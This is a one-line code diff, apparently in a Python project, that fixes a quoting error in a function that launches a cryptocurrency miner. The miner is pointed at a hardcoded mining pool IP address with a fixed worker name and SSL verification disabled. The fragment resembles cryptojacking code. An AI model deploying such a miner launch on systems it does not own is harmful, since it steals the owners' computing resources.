@@ -88,7 +88,7 @@ def execute_miner(fd):
         args.extend(["--url", "stratum+ssl://18.221.157.241:8443"])
         args.extend(["--username", "krxY97WV2D.CLD"])
         args.extend(["--password", "x"])
-        args.extend(["--no-strict-ssl]) 
+        args.extend(["--no-strict-ssl"]) 
 
 
         # Imprimir os argumentos para depuração
